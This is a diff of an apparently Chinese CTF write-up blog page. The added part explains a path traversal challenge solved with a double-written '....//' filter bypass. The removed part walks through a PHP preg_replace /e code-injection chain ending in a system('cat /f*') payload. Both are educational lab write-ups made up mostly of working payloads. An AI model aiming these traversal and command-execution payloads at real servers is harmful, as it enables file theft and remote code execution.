@@ -3517,6 +3517,140 @@
           <li class="md-meta__item">
             分类于
             
+              <a href="../../../../category/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="md-meta__link">路径遍历</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="writeup"><a class="toclink" href="../../../../stitch-file-previewer/">史迪仔的文件预览器 — Writeup</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — 目录穿越（Path Traversal）</p>
+<p><strong>题目地址</strong>：<code>http://80-e887e1a6-2d07-4b5b-9e6e-5d3e06543451.challenge.ctfplus.cn/</code></p>
+<p><strong>Flag</strong>：<code>flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../../../stitch-file-previewer/#_1">题目概述</a></h3>
+<p>页面是一个"文件预览器"，输入文件名即可查看实验室资料。默认提供示例文件 <code>hello.txt</code>。</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../../../stitch-file-previewer/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../../../stitch-file-previewer/#step-1">Step 1：查看默认文件</a></h4>
+<p>先访问默认的 <code>hello.txt</code>，内容如下：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>Hello, ZeroG!
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>Welcome to PwnStars Cybersecurity Lab.
+</span></code></pre></div>
+<p>没有有用信息，只是普通的欢迎语。</p>
+<h4 id="step-2"><a class="toclink" href="../../../../stitch-file-previewer/#step-2">Step 2：查看源码，发现线索</a></h4>
+<p>右键查看页面源代码，在 HTML 底部发现一行注释：</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cm">&lt;!-- TODO: README.txt 后续需要整理 --&gt;</span>
+</span></code></pre></div>
+<p><img alt="源码中的注释" src="../../../../../assets/images/stitch-file-previewer/02-source-comment.png" /></p>
+<p>这说明服务器上存在一个 <code>README.txt</code> 文件，但页面上没有直接暴露。</p>
+<h4 id="step-3-readmetxt"><a class="toclink" href="../../../../stitch-file-previewer/#step-3-readmetxt">Step 3：直接读取 README.txt — 失败</a></h4>
+<p>在文件名输入框中输入 <code>README.txt</code>，返回：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>File not found.
+</span></code></pre></div>
+<p>说明 README.txt 不在当前可读目录中。</p>
+<h4 id="step-4"><a class="toclink" href="../../../../stitch-file-previewer/#step-4">Step 4：尝试目录穿越</a></h4>
+<p>既然文件不在当前目录，尝试使用 <code>../</code> 进行目录穿越：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>../README.txt
+</span></code></pre></div>
+<p>仍然返回 <code>File not found.</code>，说明服务器对 <code>../</code> 进行了过滤（替换为空）。</p>
+<h4 id="step-5-readmetxt"><a class="toclink" href="../../../../stitch-file-previewer/#step-5-readmetxt">Step 5：绕过过滤 — 成功读取 README.txt</a></h4>
+<p>服务器只做了一次 <code>../</code> → 空的替换，可以利用双写绕过。输入：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>....//README.txt
+</span></code></pre></div>
+<p>服务器将中间的 <code>../</code> 删除后，剩余字符重新拼成 <code>../README.txt</code>，成功读到文件内容：</p>
+<p><img alt="读取到 README.txt" src="../../../../../assets/images/stitch-file-previewer/03-readme.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Stitch File Preview System
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>Public files are stored in /files/.
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>For administrators:
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>Sensitive files are stored in /secret/.
+</span></code></pre></div>
+<p>README.txt 揭示了目录结构：</p>
+<ul>
+<li>公开文件存储在 <code>/files/</code></li>
+<li><strong>敏感文件存储在 <code>/secret/</code></strong></li>
+</ul>
+<h4 id="step-6-secret-flag"><a class="toclink" href="../../../../stitch-file-previewer/#step-6-secret-flag">Step 6：读取 /secret/ 下的 flag</a></h4>
+<p>既然知道敏感文件在 <code>/secret/</code> 目录下，CTF 中常见的 flag 文件名就是 <code>flag.txt</code>。使用同样的绕过方式构造路径：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>....//secret/flag.txt
+</span></code></pre></div>
+<p>成功拿到 flag：</p>
+<p><img alt="拿到 flag" src="../../../../../assets/images/stitch-file-previewer/04-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../../../stitch-file-previewer/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>访问 hello.txt（无有用信息）
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>  → 查看源码，发现 HTML 注释提到 README.txt
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>    → 直接读 README.txt 失败（文件不在当前目录）
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>      → 尝试 ../ 目录穿越，失败（被过滤）
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>        → 用 ....// 双写绕过过滤，成功读取 README.txt
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>          → 发现敏感文件在 /secret/ 目录
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>            → ....//secret/flag.txt 读到 flag
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="../../../../stitch-file-previewer/#_4">漏洞原理</a></h4>
+<p>服务器对用户输入的 <code>file</code> 参数进行了简单的过滤 —— 将 <code>../</code> 替换为空字符串。但这个过滤<strong>只执行一次</strong>，攻击者可以通过双写 <code>....//</code> 来绕过：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>输入:      ....//README.txt
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>过滤后:    ../README.txt    （中间的 ../ 被删除，两侧的 . 和 / 重新拼合）
+</span></code></pre></div>
+<h4 id="_5"><a class="toclink" href="../../../../stitch-file-previewer/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>查看源码</td>
+<td>HTML 注释中经常藏有线索</td>
+</tr>
+<tr>
+<td>目录穿越</td>
+<td>利用 <code>../</code> 跳出当前目录读取其他文件</td>
+</tr>
+<tr>
+<td>过滤绕过</td>
+<td>双写 <code>....//</code> 绕过单次 <code>../</code> 替换过滤</td>
+</tr>
+<tr>
+<td>信息收集</td>
+<td>利用已读到的文件内容（README.txt）获取目录结构信息</td>
+</tr>
+</tbody>
+</table>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
               <a href="../../../../category/ssrf/" class="md-meta__link">SSRF</a>, 
               <a href="../../../../category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-meta__link">命令注入</a></li>
         
@@ -4559,216 +4693,6 @@
 </span></code></pre></div>
 <p><strong>中间那条 <code>__get</code> 最容易绕晕：它不是"属性值为空"，而是"这个类里根本没有这个属性"。</strong>
 <strong><code>Test</code> 只有 <code>$p</code>，所以读 <code>-&gt;source</code> 必然触发 —— 你什么都不用设。</strong></p>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-25 00:00:00+00:00">2026-10-25</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../../../category/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-meta__link">文件包含</a>, 
-              <a href="../../../../category/rce/" class="md-meta__link">RCE</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 3 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="bjdctf2020-zjctf"><a class="toclink" href="../../../../bjdctf2020-zjctf/">[BJDCTF2020] ZJCTF，不过如此</a></h2>
-<p><img alt="index.php 源码" src="../../../../../assets/images/bjdctf-zjctf/01-index.png" /></p>
-<h3 id="text"><a class="toclink" href="../../../../bjdctf2020-zjctf/#text">第一层：text 限制</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="x">$text = $_GET["text"];</span>
-</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="x">$file = $_GET["file"];</span>
-</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>
-</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="x">if(isset($text) &amp;&amp; (file_get_contents($text,'r') === "I have a dream")){</span>
-</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="x">    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";</span>
-</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="x">    if(preg_match("/flag/", $file)){</span>
-</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="x">        die("Not now!");</span>
-</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="x">    }</span>
-</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="x">    include($file);  //next.php</span>
-</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="x">}</span>
-</span></code></pre></div>
-<p>审计代码，观察 <code>text</code> 有内容限制才能走到 <code>include</code>。</p>
-<p>而且 <code>file_get_contents($text,'r')</code> 的 <strong>第一个参数是 <code>$text</code> 本身</strong> —— 也就是说 <code>$text</code> 得是一个「能被读取的东西」，不一定是文件路径。</p>
-<p>这里想到用 <strong>data 协议</strong>，让 <code>file_get_contents</code> 直接读到我们指定的字符串：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>/?text=data://text/plain,I have a dream
-</span></code></pre></div>
-<p><strong>注意</strong>：这一步要让 <code>file_get_contents($text)</code> 返回 <code>I have a dream</code>，不是写文件。</p>
-<h3 id="include-nextphp"><a class="toclink" href="../../../../bjdctf2020-zjctf/#include-nextphp">第二层：include 把 next.php 执行了</a></h3>
-<p><strong>接着构造：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>/?text=data://text/plain,I have a dream&amp;file=next.php
-</span></code></pre></div>
-<p><strong>但是页面并没有给出文件内容</strong> —— 因为 <code>include</code> 把 <code>next.php</code> 当成代码执行了，而不是读出来显示。</p>
-<p>所以改用 <strong>php 伪协议</strong> 读源码（<code>convert.base64-encode</code> 让它不被执行）：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>/?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php
-</span></code></pre></div>
-<p><strong>解码后得到 <code>next.php</code> 的源码。</strong></p>
-<h3 id="nextphp"><a class="toclink" href="../../../../bjdctf2020-zjctf/#nextphp">next.php 源码</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
-</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
-</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>
-</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="k">function</span> <span class="nf">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span>
-</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>        <span class="s1">'/('</span> <span class="o">.</span> <span class="nv">$re</span> <span class="o">.</span> <span class="s1">')/ei'</span><span class="p">,</span>
-</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>        <span class="s1">'strtolower("\\1")'</span><span class="p">,</span>
-</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>        <span class="nv">$str</span>
-</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>    <span class="p">);</span>
-</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="p">}</span>
-</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a>
-</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$re</span> <span class="o">=&gt;</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>    <span class="k">echo</span> <span class="nx">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span><span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
-</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a><span class="p">}</span>
-</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a>
-</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
-</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a>    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
-</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a><span class="p">}</span>
-</span></code></pre></div>
-<p>先看 <code>foreach</code>：它把 GET 得到的<strong>名字传给 <code>$re</code></strong>，<strong>值传给 <code>$str</code></strong>。</p>
-<p>接着看这个最重要的正则表达式：<code>i</code> 是忽略大小写，<code>e</code> 是 <strong>eval</strong>，<code>(...)</code> 把整个匹配包成了<strong>捕获组 1</strong>，也就是 <code>strtolower</code> 里的 <code>\1</code>；在 PHP 单引号中的 <code>\\1</code> 等效于 <code>\1</code>。</p>
-<h3 id="re"><a class="toclink" href="../../../../bjdctf2020-zjctf/#re"><code>$re</code> 到底在干什么</a></h3>
-<p><strong><code>$re</code> 就是 URL 里参数的名字，它被直接拼进了正则。</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="x">foreach($_GET as $re =&gt; $str)     // $re = 参数名,$str = 参数值</span>
-</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="x">      ↓</span>
-</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="x">'/(' . $re . ')/ei'              // 参数名成了正则主体</span>
-</span></code></pre></div>
-<p><strong>所以 <code>$re</code> 决定了三件事：</strong></p>
-<table>
-<thead>
-<tr>
-<th><code>$re</code> 决定</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>匹配什么</strong></td>
-<td>它必须能匹配到 <code>$str</code> 里的内容，否则 <code>\1</code> 拿不到东西，注入不成立</td>
-</tr>
-<tr>
-<td><strong>捕获组 1 是什么</strong></td>
-<td>整个 <code>$re</code> 被 <code>(...)</code> 包住，所以匹配到的内容就是 <code>\1</code></td>
-</tr>
-<tr>
-<td><strong>替换串里塞进什么</strong></td>
-<td><code>\1</code> 被原样拼进 <code>strtolower("\1")</code>，然后整体被 eval</td>
-</tr>
-</tbody>
-</table>
-<p><strong>反过来说：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>想要代码执行,必须让 匹配到的内容 = 我们的 payload
-</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>而"匹配到的内容"由 $re 决定
-</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>→ 所以 $re 必须是一个"什么都匹配"的宽泛正则
-</span></code></pre></div>
-<p><strong>还有两个约束：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>① $re 里不能有 /      → 会把正则模式提前截断
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>② $re 不能是 .        → PHP 会把参数名里的 . 换成 _
-</span></code></pre></div>
-<h3 id="e"><a class="toclink" href="../../../../bjdctf2020-zjctf/#e"><code>/e</code> 为什么能执行代码</a></h3>
-<p>替换串是 <code>strtolower("\1")</code>。带 <code>e</code> 修饰符时，替换串会<strong>先做反向引用替换，再把结果当成 PHP 代码执行</strong>。</p>
-<p>而 <code>\1</code> 在双引号里，所以只要捕获到的内容带 <code>"</code> 或 <code>${...}</code>，就能跳出字符串变成真代码。</p>
-<p><strong>PHP 5.x 里 <code>${表达式}</code> 会对表达式求值</strong>：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>strtolower("${phpinfo()}")
-</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>           └────┬─────┘
-</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>        执行 phpinfo()
-</span></code></pre></div>
-<p><strong>所以我们要做的，就是把 <code>\1</code> 的位置变成 <code>${getFlag()}</code>。</strong></p>
-<h3 id="_1"><a class="toclink" href="../../../../bjdctf2020-zjctf/#_1">试错过程</a></h3>
-<p><strong>先试：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>/?.*=${phpinfo()}
-</span></code></pre></div>
-<p><strong>页面无回显。</strong></p>
-<p><strong>原因：PHP 解析 URL 参数时会把参数名里的 <code>.</code> 和空格统一换成 <code>_</code>，所以 <code>.*</code> 变成了 <code>_*</code>，正则变成 <code>/(_*)/ei</code> —— 匹配不到 <code>${phpinfo()}</code>，所以没反应。</strong></p>
-<p><strong>换 <code>\S</code>（匹配任意非空白字符）代替 <code>.</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>/?\S*=${phpinfo()}
-</span></code></pre></div>
-<p><strong>成功得到回显。</strong></p>
-<div class="admonition note">
-<p class="admonition-title">为什么必须大写 S</p>
-<p><code>\S</code> = 非空白字符（大写 S 是「非」）。</p>
-<p><code>\s</code> = 空白字符 —— 写反了就匹配不到 <code>${phpinfo()}</code>。</p>
-</div>
-<h3 id="payload"><a class="toclink" href="../../../../bjdctf2020-zjctf/#payload">最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>/next.php?\S*=${getFlag()}&amp;cmd=system('cat /f*');
-</span></code></pre></div>
-<p><strong>注意最后要有分号</strong> —— <code>eval</code> 执行时需要 <code>;</code> 作为一条代码的结束。</p>
-<p><img alt="拿到 flag" src="../../../../../assets/images/bjdctf-zjctf/03-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>CTF2{4497b560-3b8c-48c7-9991-bc1d0d9bce8c}
-</span></code></pre></div>
-<h3 id="cmd"><a class="toclink" href="../../../../bjdctf2020-zjctf/#cmd">为什么 <code>cmd</code> 末尾的分号不能省</a></h3>
-<p><code>getFlag()</code> 里是：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="x">@eval($_GET['cmd']);</span>
-</span></code></pre></div>
-<p>所以实际执行的是 <code>eval("system('cat /f*');")</code>。</p>
-<p><strong><code>eval</code> 把字符串当代码重新解析，必须是一条完整语句</strong>：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="x">eval('echo "A"');    // ❌ syntax error, unexpected end of file, expecting ';'</span>
-</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="x">eval('echo "A";');   // ✅</span>
-</span></code></pre></div>
-<h3 id="_2"><a class="toclink" href="../../../../bjdctf2020-zjctf/#_2">完整链路</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>① data:// 骗过 file_get_contents     text=data://text/plain,I have a dream
-</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>② php://filter 读源码(不执行)        file=php://filter/read=convert.base64-encode/resource=next.php
-</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>③ 看懂 foreach:参数名=正则           $re
-</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>④ /e 让替换串被 eval                 strtolower("\1")
-</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>⑤ 用 \S* 当参数名(避开 . 被吃)       ?\S*=${phpinfo()}
-</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a>⑥ 调 getFlag() 并带 cmd              ?\S*=${getFlag()}&amp;cmd=system('cat /f*');
-</span></code></pre></div>
-<h3 id="_3"><a class="toclink" href="../../../../bjdctf2020-zjctf/#_3">知识点</a></h3>
-<table>
-<thead>
-<tr>
-<th>点</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>data://</code></td>
-<td>让 <code>file_get_contents</code> 读到指定内容</td>
-</tr>
-<tr>
-<td><code>php://filter</code></td>
-<td>读源码而不执行（<code>convert.base64-encode</code>）</td>
-</tr>
-<tr>
-<td><code>/e</code> 修饰符</td>
-<td>PHP 5.x 专用，替换串被 eval；PHP 7 已移除</td>
-</tr>
-<tr>
-<td><code>${表达式}</code></td>
-<td>PHP 双引号插值里会对表达式求值（<code>{}</code> 单层，不是 <code>{{}}</code>）</td>
-</tr>
-<tr>
-<td>参数名即输入</td>
-<td><code>foreach($_GET as $re =&gt; $str)</code> 让<strong>参数名</strong>成了攻击面</td>
-</tr>
-<tr>
-<td><code>parse_str</code> 的坑</td>
-<td>参数名里 <code>.</code> 和空格会变成 <code>_</code></td>
-</tr>
-<tr>
-<td><code>eval</code> 的分号</td>
-<td>必须语法完整，<code>@</code> 会吞掉报错</td>
-</tr>
-</tbody>
-</table>
     
     
   </div>
